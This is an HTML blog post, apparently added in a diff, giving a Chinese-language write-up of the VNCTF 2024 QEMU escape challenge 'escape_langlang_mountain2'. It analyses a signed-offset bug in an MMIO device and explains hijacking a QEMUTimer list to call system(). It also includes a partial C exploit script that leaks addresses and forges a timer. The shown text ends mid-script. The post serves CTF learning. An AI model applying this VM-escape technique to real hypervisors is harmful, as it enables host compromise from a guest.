@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>VNCTF 2024 escape_langlang_mountain2 | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="VNCTF 2024 escape_langlang_mountain2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T" />
+<meta property="og:description" content="第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T" />
+<link rel="canonical" href="https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html" />
+<meta property="og:url" content="https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-02-19T05:23:25+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="VNCTF 2024 escape_langlang_mountain2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-02-19T05:23:25+08:00","datePublished":"2024-02-19T05:23:25+08:00","description":"第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T","headline":"VNCTF 2024 escape_langlang_mountain2","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html"},"url":"https://www.cameudis.com/2024/02/19/VNCTF2024-escape-langlang-mountain2.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">VNCTF 2024 escape_langlang_mountain2</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-02-19T05:23:25+08:00" itemprop="datePublished">Feb 19, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T</p>
+
+<p>题目链接：<a href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">xtxtn/vnctf2024-escape_langlang_mountain2wp (github.com)</a></p>
+
+<p>关于qemu pwn入门，网上中文资料非常多：</p>
+<ul>
+  <li><a href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/dev/">QEMU - CTFwiki</a></li>
+  <li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 - xuanxuanblingbling</a></li>
+  <li><a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/">QEMU 简易食用指南 - Arttnba3</a></li>
+  <li><a href="https://l0tus.vip/cn/qemu_escape/">虚拟机逃逸初探 - l0tus</a> l0tus师傅什么时候更新啊！！</li>
+</ul>
+
+<h2 id="环境与调试">环境与调试</h2>
+
+<p>理想的环境是 qemu 内的系统有 ssh，这样就可以直接连上去，甚至使用 scp 传 payload，但是这题没有。
+我采用的调试方法是在 Dockerfile 中加一个 gdb，这样就可以在 docker 中调试，但是最佳的调试方法应该是往 docker 里面塞一个 gdbserver，然后用主机的 gdb attach 上去，这样就可以使用主机里的插件。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>题目实现设备提供了 <code class="language-plaintext highlighter-rouge">vn_mmio_read</code> 和 <code class="language-plaintext highlighter-rouge">vn_mmio_write</code> 两个函数。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">vn_mmio_read</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">****</span><span class="n">a1</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-14h]</span>
+  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">object_dynamic_cast_assert</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">"vn"</span><span class="p">,</span> <span class="s">"../qemu-8.1.4/hw/misc/vnctf.c"</span><span class="p">,</span> <span class="mi">21u</span><span class="p">,</span> <span class="s">"vn_mmio_read"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40LL</span> <span class="o">+</span> <span class="n">v4</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">object+0xb80</code> 用来保存一个偏移，该函数可以根据缓冲区的相对偏移读数据。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">vn_mmio_write</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">****</span><span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">object_dynamic_cast_assert</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">"vn"</span><span class="p">,</span> <span class="s">"../qemu-8.1.4/hw/misc/vnctf.c"</span><span class="p">,</span> <span class="mi">42u</span><span class="p">,</span> <span class="s">"vn_mmio_write"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">48</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB84</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span><span class="c1">// 一次int范围内任意写</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB84</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">&lt;=</span> <span class="mh">0x30</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">a3</span> <span class="o">&lt;=</span> <span class="mi">60</span> <span class="p">)</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mh">0xB80</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x3C</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xB40</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>write 中提供了三个功能：</p>
+
+<ul>
+  <li>addr==16：设置 0xB80 处的偏移变量</li>
+  <li>addr==32：正常的 Buffer 内读写（0x40 大小空间，没有越界）</li>
+  <li>addr==48：根据偏移变量写入数据（仅限一次）</li>
+</ul>
+
+<p>在检查偏移变量的大小时，由于检查类型是 signed，因此可以把偏移修改为一个负数。于是我们就可以有无限次的任意相对地址读，以及一次任意相对地址写入。</p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>整体思路：</p>
+<ol>
+  <li>在设备 Object 结构体内寻找堆地址和程序地址并泄露</li>
+  <li>从 main_loop_tlg 泄露出第二个 timerlist 的地址</li>
+  <li>在设备 Buffer 中伪造 QEMUTimer 结构体</li>
+  <li>劫持 timerlist 的 active_timers 指针为伪造的结构体</li>
+</ol>
+
+<h3 id="地址泄露">地址泄露</h3>
+
+<p>由于我第一次打 qemu pwn，对于其中各种结构体都比较陌生，所以我直接用本办法，在动态调试的时候查看 Buffer 前面的数据，从里面找到可以泄露的指针。（从而给后面本地打得通远程打不通埋下了伏笔）</p>
+
+<p>在不清除结构体信息的情况下，找泄露的时候需要注意一些查找要点：</p>
+<ul>
+  <li>泄露程序基地址时，随便找一个指向程序某地址的指针泄露就行了；</li>
+  <li>泄露堆地址时要注意，不同环境之间的堆环境可能不一样，因此在寻找时（假设我们想要泄露设备 Buffer 的地址）：
+    <ul>
+      <li>最佳的泄露用指针是和 Buffer 处于同一个结构体中的指针</li>
+      <li>其次是和 Buffer 所在结构体位置相近的指针，越相近越好</li>
+    </ul>
+  </li>
+  <li><del>计算堆基址并没有什么用</del></li>
+</ul>
+
+<p>根据这种方法可以找到两个指针，然后泄露即可。</p>
+
+<p>当然，如果你是一位对设备的 Object 结构体比较熟悉的 qemu pwn 大师，那么你就可以直接泄露结构体的某些字段来泄露程序和堆的地址。具体来说，可以通过 MemoryRegion 结构体：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">MemoryRegion</span> <span class="p">{</span>
+    <span class="p">...</span>
+    <span class="p">...</span>
+    <span class="n">DeviceState</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>
+
+    <span class="k">const</span> <span class="n">MemoryRegionOps</span> <span class="o">*</span><span class="n">ops</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
+    <span class="n">MemoryRegion</span> <span class="o">*</span><span class="n">container</span><span class="p">;</span>
+    <span class="p">...</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">ops</code> 指向 data 段的 <code class="language-plaintext highlighter-rouge">vn_mmio_ops</code>，<code class="language-plaintext highlighter-rouge">opaque</code> 更是指向 vn 的设备结构体，因此泄露这两个指针就可以准确泄露地址，不用担心什么偏移不一样的问题。</p>
+
+<h3 id="控制流劫持">控制流劫持</h3>
+
+<p>在网上可以找到的大部分 pwn 题中，设备本身就有一些函数指针，劫持它们就可以劫持控制流（甚至参数），但本题的设备就是单纯的读和写，并没有什么 <code class="language-plaintext highlighter-rouge">encode</code>、<code class="language-plaintext highlighter-rouge">rand</code> 之类的函数。因此，本题需要一个通用的控制流劫持方法。</p>
+
+<p>在 Qemu 中，可以通过注册一个 QEMUTimer 来让 qemu 在一段时间间隔之后调用一个函数，参数为一个 opauqe 指针。相关结构体定义如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="p">{</span>
+    <span class="kt">int64_t</span> <span class="n">expire_time</span><span class="p">;</span>        <span class="cm">/* in nanoseconds */</span>
+    <span class="n">QEMUTimerList</span> <span class="o">*</span><span class="n">timer_list</span><span class="p">;</span>
+    <span class="n">QEMUTimerCB</span> <span class="o">*</span><span class="n">cb</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
+    <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">scale</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="p">{</span>
+    <span class="n">QEMUClock</span> <span class="o">*</span><span class="n">clock</span><span class="p">;</span>
+    <span class="n">QemuMutex</span> <span class="n">active_timers_lock</span><span class="p">;</span>
+    <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">active_timers</span><span class="p">;</span>
+    <span class="n">QLIST_ENTRY</span><span class="p">(</span><span class="n">QEMUTimerList</span><span class="p">)</span> <span class="n">list</span><span class="p">;</span>
+    <span class="n">QEMUTimerListNotifyCB</span> <span class="o">*</span><span class="n">notify_cb</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_opaque</span><span class="p">;</span>
+    <span class="n">QemuEvent</span> <span class="n">timers_done_ev</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>从内存视角看两个结构体长这样：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="p">{</span>
+    <span class="kt">int64_t</span> <span class="n">expire_time</span><span class="p">;</span>        <span class="cm">/* in nanoseconds */</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">timer_list</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">cb</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">scale</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span> <span class="n">clock</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">active_timers_lock</span><span class="p">[</span><span class="mh">0x38</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">active_timers</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="o">*</span><span class="n">le_next</span><span class="p">;</span>   <span class="cm">/* next element */</span>                      \
+    <span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="o">**</span><span class="n">le_prev</span><span class="p">;</span>  <span class="cm">/* address of previous next element */</span>  \
+    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_cb</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_opaque</span><span class="p">;</span>
+
+    <span class="cm">/* lightweight method to mark the end of timerlist's running */</span>
+    <span class="kt">size_t</span> <span class="n">timers_done_ev</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>在 bss 段有一个数组 <code class="language-plaintext highlighter-rouge">main_loop_tlg[4]</code>，保存了一些 <code class="language-plaintext highlighter-rouge">QEMUTimerList</code> 结构体指针，每个 <code class="language-plaintext highlighter-rouge">active_timers</code> 都指向一个由 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 结构体组成的链表。qemu 会遍历这些 <code class="language-plaintext highlighter-rouge">QEMUTimerList</code> 来检查所有 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 有没有超时并调用它们的 callback 函数（也就是调用 <code class="language-plaintext highlighter-rouge">timer-&gt;cb(timer-&gt;opaque)</code>，相关源码见<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L588">qemu-timer.c - util/qemu-timer.c - Qemu source code (v4.2.1) - Bootlin</a>）。</p>
+
+<p>因此，我们可以在通过 <code class="language-plaintext highlighter-rouge">main_loop_tlg</code> 泄露某个 timerlist 的地址后，劫持它的 <code class="language-plaintext highlighter-rouge">active_timers</code> 指针并伪造一个 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 结构体，从而控制程序调用函数以及参数。</p>
+
+<p>伪造 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 时，可以这样写：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">timer</span><span class="o">-&gt;</span><span class="n">expire_time</span> <span class="o">=</span> <span class="mh">0x114514</span><span class="p">;</span>
+<span class="n">timer</span><span class="o">-&gt;</span><span class="n">timer_list</span> <span class="o">=</span> <span class="err">对应的</span><span class="n">timer_list</span><span class="err">地址</span><span class="p">;</span>
+<span class="n">timer</span><span class="o">-&gt;</span><span class="n">cb</span> <span class="o">=</span> <span class="n">system</span><span class="err">@</span><span class="n">plt</span><span class="p">;</span>
+<span class="n">timer</span><span class="o">-&gt;</span><span class="n">opaque</span> <span class="o">=</span> <span class="s">"cat flag"</span><span class="p">;</span>
+<span class="n">timer</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+<span class="n">timer</span><span class="o">-&gt;</span><span class="n">scale</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>这样程序就会在 0x114514 纳秒之后调用 <code class="language-plaintext highlighter-rouge">system("cat flag")</code>。</p>
+
+<p>该方法主要参考了：</p>
+<ul>
+  <li><a href="https://blog.bi0s.in/2019/08/13/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/">QEMU VM Escape - bi0s</a></li>
+  <li><a href="https://xtxtn.github.io/2023/10/11/CVE-2020-14364/#%E4%BF%AE%E6%94%B9time-list">CVE-2020-14364 - xtxtn’s Blog</a></li>
+</ul>
+
+<h3 id="exp-脚本">EXP 脚本</h3>
+
+<p>没有在在线环境下试过这个脚本，不过猜测在线问题不大==。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GUN_SOURCE
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/io.h&gt;</span><span class="cp">
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mmio_mem</span><span class="p">;</span>
+<span class="kt">uint32_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="kt">uint32_t</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">uint64_t</span> <span class="nf">buffer_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="n">index</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"open mmio failed"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"mmap failed !"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">uint64_t</span> <span class="n">prog_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x88</span><span class="p">);</span>
+    <span class="n">prog_base</span> <span class="o">+=</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x82b35b</span><span class="p">;</span>
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x84</span><span class="p">);</span>
+    <span class="n">prog_base</span> <span class="o">|=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]prog_base: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">prog_base</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">;</span>
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mi">2808</span><span class="p">);</span>
+    <span class="n">heap_base</span> <span class="o">+=</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mi">192</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">buf_addr</span> <span class="o">=</span> <span class="n">heap_base</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]buffer: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">);</span>
+
+    <span class="c1">// leak timer</span>
+    <span class="kt">uint64_t</span> <span class="n">main_loop_tlg</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x14B9480</span><span class="p">;</span>
+    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">main_loop_tlg</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="n">buf_addr</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">timer_list</span> <span class="o">=</span> <span class="p">(</span><span class="n">prog_base</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">))</span> <span class="o">+</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">timer_ptr</span> <span class="o">=</span> <span class="n">timer_list</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]timer_list: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timer_list</span><span class="p">);</span>
+
+    <span class="c1">// fake timer</span>
+    <span class="kt">uint64_t</span> <span class="n">system_plt</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x312040</span><span class="p">;</span>
+
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x114514</span><span class="p">);</span>
+    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">timer_list</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
